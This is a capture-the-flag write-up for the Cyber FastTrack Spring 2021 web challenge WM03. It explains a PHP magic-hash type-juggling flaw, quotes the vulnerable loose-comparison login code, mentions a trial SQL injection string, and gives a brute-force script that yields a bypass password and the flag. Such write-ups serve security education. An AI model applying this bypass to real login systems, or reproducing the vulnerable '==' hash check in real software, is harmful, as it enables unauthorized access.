# Cyber FastTrack Spring 2021

### Solver: Will Green ([Ducky](https://github.com/wlg0005))
### Challenge: WM03
### Category: Web (Medium)

## Description:
#### [250 pts]: Visit the site at [https://cfta-wm03.allyourbases.co](https://cfta-wm03.allyourbases.co) and find a way to bypass the password check.

## Walkthrough:
Navigating to the provided URL, we're presented with a page that asks for a password:

![](WM03%20Writeup.001.png)

At first, I tried simple SQL injections such as `' or 1=1 --` and other variations but this didn't lead me anywhere. So the next thing I tried was looking at the page source, where I found an interesting comment with the following code:

```php
TODO: remove, taken from OSS project, login contains:
return function ($event) {
    require_once("flag.php");
    $hash = "0e747135815419029880333118591372";
    $salt = "e361bfc569ba48dc";
        if (isset($event['password']) && is_string($event['password'])) {
            if (md5($salt . $event['password']) == $hash) {
                return $flag;
            }
        }
        return "Incorrect";
    };
```

So it looks like we're looking for a password that when MD5 hashed with the salt `e361bfc569ba48dc` will equal `0e747135815419029880333118591372`. 

There is a rather well known and interesting programming mistake that can be found in PHP which is centered around using a loose comparison (==). Since in a loose comparison only the value and not the type of the variable is checked, the value `0e747135815419029880333118591372` will be equal to 0. This is because in PHP you can use `e` to represent numbers in E notation (i.e 10e1 = 10 * 10^1 = 100).

Cool, so we have a good understanding of the vulnerability now. I crafted the following script to find a password that when hashed will begin with `0e` and thus equal the goal hash:

```php
<?php
$i = 0; // our password

// while the md5 hash of the salt + our password != the goal hash
do{
    $i++; // increment our password by 1
} while(md5("e361bfc569ba48dc".strval($i)) != "0e747135815419029880333118591372");
echo $i; // echo the password when they're equal
?>
```

Running the script and waiting a few seconds we get our password: `15896119`. Using this password we get the flag:

![](WM03%20Writeup.002.png)

### Flag: theLOOSEtheMATH&theTRUTHY

